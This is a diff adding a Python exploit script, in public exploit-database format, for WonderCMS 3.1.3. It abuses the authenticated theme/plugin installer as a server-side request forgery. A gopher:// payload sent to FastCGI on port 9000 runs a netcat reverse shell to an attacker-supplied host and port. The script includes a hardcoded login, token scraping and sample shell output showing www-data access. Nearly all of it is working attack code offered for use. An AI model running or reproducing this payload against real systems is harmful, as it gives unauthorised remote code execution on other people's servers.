@@ -1,0 +1,77 @@
+# Exploit Title: WonderCMS 3.1.3 - Authenticated SSRF to Remote Remote Code Execution
+# Date: 2020-11-27
+# Exploit Author: zetc0de
+# Vendor Homepage: https://www.wondercms.com/
+# Software Link: https://github.com/robiso/wondercms/releases/download/3.1.3/WonderCMS-3.1.3.zip
+# Version: 3.1.3
+# Tested on: Ubuntu 16.04
+# CVE : N/A
+
+# WonderCMS is vulnerable to SSRF Vulnerability.
+# In order to exploit the vulnerability, an attacker must have a valid authenticated session on the CMS.
+# The theme/plugin installer not sanitize the destination of github/gitlab url, so attacker can pointing te destinaition to localhost.  
+# when the attacker can pointing the request to localhost, this lead to SSRF vulnerability. 
+# the most high impact lead to RCE with gopher scheme and FastCGI running in port 9000
+# 
+# python exploit.py
+# [+] Getting Token
+# [+] Sending payload
+# [+] Get reverse shell
+
+# nc -lnvp 1234
+# Connection from 192.168.43.103:56956
+# /bin/sh: 0: can't access tty; job control turned off
+# $ whoami
+# www-data
+# $
+
+import requests
+from bs4 import BeautifulSoup
+from termcolor import colored
+from time import sleep
+
+print(colored('''
+
+\ \      /_ \  \ | _ \ __| _ \  __|  \  |  __| 
+ \ \ \  /(   |.  | |  |_|    / (    |\/ |\__ \ 
+  \_/\_/\___/_|\_|___/___|_|_\\___|_|  _|____/ 
+                                               
+------[  SSRF to Remote Code Execution ]------
+	''',"blue"))
+
+
+loginURL = "http://wonder.com/loginURL"
+password = "GpIyq0RH"
+lhost = "192.168.43.66"
+lport = "1234"
+payload = "gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH132%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/usr/share/php/PEAR.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2584%2504%2500%253C%253Fphp%2520system%2528%2527rm%2520/tmp/f%253Bmkfifo%2520/tmp/f%253Bcat%2520/tmp/f%257C/bin/sh%2520-i%25202%253E%25261%257Cnc%2520{}%2520{}%2520%253E/tmp/f%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500".format(lhost,lport)
+
+
+r = requests.session()
+data = { "password" : password }
+page = r.post(loginURL,data)
+if "Wrong" in page.text:
+	print(colored("[!] Exploit Failed : Wrong Credential","red"))
+	exit()
+
+print(colored("[+] Getting Token","cyan"))
+soup = BeautifulSoup(page.text, "html.parser")
+
+allscript  = soup.find_all("script")
+no = 0
+for i in allscript:
+	if "rootURL" in str(i):
+		url = i.string.split("=")[1].replace('"','').strip(";").lstrip(" ")
+	elif "token" in str(i):
+		token = i.string.split("=")[1].replace('"','').strip(";").lstrip(" ")
+
+
+def sendPayload(req,url,payload,token):
+	getShell = url + "?installThemePlugin=" + payload + "&type=plugins&token=" + token
+	req.get(getShell)
+
+print(colored("[+] Sending payload","cyan"))
+sleep(1)
+print(colored("[+] Get reverse shell","cyan"))
+sendPayload(r,url,payload,token)
+print(colored("[+] Good bye","cyan"))
